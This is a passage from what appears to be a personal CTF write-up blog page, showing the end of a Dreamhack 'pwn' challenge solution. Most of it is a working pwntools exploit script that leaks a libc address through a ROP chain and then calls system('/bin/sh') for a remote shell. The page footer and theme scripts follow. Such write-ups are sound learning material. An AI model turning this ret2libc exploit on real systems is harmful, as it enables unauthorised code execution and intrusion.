+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;host8.dreamhack.games:21304&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(p)</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401446</span>
+</span></span><span style="display:flex;"><span>unsafe <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401426</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>addr1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x404010</span>)
+</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> p32(main)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Decision2Solve</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#must be 8 len</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(addr1)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#must be 6 len</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(val <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#safe -&gt; return to main</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#do this a thousand times i guess</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;sup&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x400</span>):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;i is </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#have 0x10000 bytes into v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#40129b: pop rdi; nop; pop rbp; ret; </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi_nop_pop_rbp_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40129b</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> ( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p64(pop_rdi_nop_pop_rbp_ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p64(puts_got) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>            p64(puts_plt) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p64(unsafe)
+</span></span><span style="display:flex;"><span>          )
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x10000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span>  u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> val <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#takes too long to bother checking one gadgets</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret back to unsafe_func not main bc we fucked the registers</span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> ( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p64(pop_rdi_nop_pop_rbp_ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p64(binsh) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p64(ret) <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>            p64(system) 
+</span></span><span style="display:flex;"><span>          )
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x10000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/seaofstack.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/dreamhack/">Dreamhack</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
